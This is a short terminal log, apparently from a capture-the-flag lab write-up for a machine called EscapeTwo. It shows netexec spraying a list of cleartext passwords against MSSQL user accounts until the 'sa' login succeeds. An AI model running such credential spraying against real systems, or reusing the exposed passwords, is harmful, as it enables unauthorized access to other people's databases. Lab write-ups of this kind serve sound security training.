
``` shell

┌──(kali㉿kali)-[~/machines/EscapeTwo/content]
└─$ netexec mssql 10.129.222.60 -u users.txt -p pass.txt --continue-on-success --local-auth  
MSSQL       10.129.222.60   1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.222.60   1433   DC01             [-] DC01\angela:0fwz7Q4mSpurIt99 (Login failed for user 'angela'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\oscar:0fwz7Q4mSpurIt99 (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\kevin:0fwz7Q4mSpurIt99 (Login failed for user 'kevin'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\sa:0fwz7Q4mSpurIt99 (Login failed for user 'sa'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\angela:86LxLBMgEWaKUnBG (Login failed for user 'angela'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\oscar:86LxLBMgEWaKUnBG (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\kevin:86LxLBMgEWaKUnBG (Login failed for user 'kevin'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\sa:86LxLBMgEWaKUnBG (Login failed for user 'sa'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\angela:Md9Wlq1E5bZnVDVo (Login failed for user 'angela'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\oscar:Md9Wlq1E5bZnVDVo (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\kevin:Md9Wlq1E5bZnVDVo (Login failed for user 'kevin'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\sa:Md9Wlq1E5bZnVDVo (Login failed for user 'sa'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\angela:MSSQLP@ssw0rd! (Login failed for user 'angela'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\oscar:MSSQLP@ssw0rd! (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [-] DC01\kevin:MSSQLP@ssw0rd! (Login failed for user 'kevin'. Please try again with or without '--local-auth')
MSSQL       10.129.222.60   1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```
